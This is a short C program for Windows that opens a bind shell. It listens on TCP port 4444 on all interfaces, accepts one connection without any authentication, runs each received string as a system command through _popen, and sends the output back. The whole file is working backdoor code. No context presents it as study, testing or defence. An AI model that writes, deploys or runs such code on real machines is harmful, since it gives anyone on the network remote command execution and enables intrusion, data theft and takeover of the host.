#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")

#define PORT 4444

void error(const char *msg) {
    perror(msg);
    exit(1);
}

int main(int argc, char *argv[]) {
    WSADATA wsa;
    SOCKET s, new_socket;
    struct sockaddr_in server, client;
    int c;
    char buffer[1024];
    int bytes_received;

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        error("Failed to initialize Winsock");
    }

    // Create a socket
    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s == INVALID_SOCKET) {
        error("Socket creation failed");
    }

    // Set up the server address structure
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = INADDR_ANY;
    server.sin_port = htons(PORT);

    // Bind the socket
    if (bind(s, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR) {
        error("Bind failed");
    }

    // Listen for incoming connections
    if (listen(s, 3) == SOCKET_ERROR) {
        error("Listen failed");
    }

    // Accept a connection
    c = sizeof(struct sockaddr_in);
    new_socket = accept(s, (struct sockaddr *)&client, &c);
    if (new_socket == INVALID_SOCKET) {
        error("Accept failed");
    }

    // Communication loop
    while (1) {
        memset(buffer, 0, sizeof(buffer));
        bytes_received = recv(new_socket, buffer, sizeof(buffer) - 1, 0);
        if (bytes_received <= 0) {
            break;
        }

        // Execute the command and send the output back
        FILE *fp;
        char result[1024];
        fp = _popen(buffer, "r");
        if (fp == NULL) {
            send(new_socket, "Failed to execute command", 26, 0);
        } else {
            while (fgets(result, sizeof(result), fp) != NULL) {
                send(new_socket, result, strlen(result), 0);
            }
            _pclose(fp);
        }
    }

    // Cleanup
    closesocket(new_socket);
    closesocket(s);
    WSACleanup();
    return 0;
}